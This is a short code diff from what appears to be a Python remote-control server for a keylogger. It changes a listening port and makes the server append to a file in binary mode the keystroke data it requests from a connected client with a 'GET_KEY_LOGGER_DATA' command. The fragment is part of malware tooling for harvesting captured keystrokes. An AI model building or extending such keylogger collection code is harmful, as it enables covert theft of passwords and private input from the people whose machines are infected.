@@ -53,7 +53,7 @@ def full_bin_file_to_buffer(file_path):
 
 if __name__ == '__main__':
     TCP_IP = '127.0.0.1'
-    TCP_PORT = 5007
+    TCP_PORT = 5009
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((TCP_IP, TCP_PORT))
@@ -141,7 +141,7 @@ if __name__ == '__main__':
         SocketManager.send_data(conn, "GET_KEY_LOGGER_DATA") #TODO: still not working with special keys
         key_logger_data = SocketManager.receive(conn)
         try:
-           with open(KEY_LOGGER_FILE, 'a') as fp:
+           with open(KEY_LOGGER_FILE, 'ab') as fp:
                fp.write(key_logger_data)
 
         except Exception as ex:
